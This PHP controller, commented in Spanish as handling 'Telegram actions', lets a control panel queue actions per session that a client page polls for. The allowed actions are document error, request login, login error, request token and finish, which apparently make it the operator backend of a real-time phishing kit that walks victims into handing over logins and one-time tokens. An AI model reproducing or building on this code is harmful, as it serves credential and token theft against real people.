<?php

declare(strict_types=1);

namespace App\Controllers;

use App\Repositories\ActionRepository;
use App\Services\LoggerService;
use App\Models\Action;

/**
 * Action Controller - Maneja las acciones de Telegram
 */
final class ActionController
{
    public function __construct(
        private ActionRepository $actionRepository,
        private LoggerService $logger
    ) {
    }

    /**
     * Chequea si hay una acción pendiente para la sesión actual
     */
    public function checkAction(string $sessionId): void
    {
        $action = $this->actionRepository->popAction($sessionId);

        header('Content-Type: application/json');
        header('Cache-Control: no-cache, no-store, must-revalidate');
        header('Pragma: no-cache');
        header('Expires: 0');

        if ($action === null) {
            echo json_encode(['action' => null]);
            return;
        }

        $this->logger->debug('Action retrieved', [
            'session_id' => $sessionId,
            'action' => $action->getAction(),
        ]);

        echo json_encode(['action' => $action->getAction()]);
    }

    /**
     * Guarda una acción desde el panel de control
     */
    public function saveAction(array $data): void
    {
        header('Content-Type: application/json');

        $sessionId = $data['sessionId'] ?? '';
        $actionName = $data['action'] ?? '';

        if (empty($sessionId) || empty($actionName)) {
            echo json_encode(['success' => false, 'message' => 'Datos inválidos']);
            return;
        }

        $validActions = ['error_documento', 'pedir_logo', 'error_logo', 'pedir_token', 'finalizar'];
        if (!in_array($actionName, $validActions, true)) {
            echo json_encode(['success' => false, 'message' => 'Acción inválida']);
            return;
        }

        $action = new Action($actionName, time());
        $saved = $this->actionRepository->save($sessionId, $action);

        if ($saved) {
            echo json_encode([
                'success' => true,
                'message' => 'Acción enviada correctamente',
                'action' => $actionName,
            ]);
        } else {
            echo json_encode(['success' => false, 'message' => 'Error al guardar la acción']);
        }
    }
}
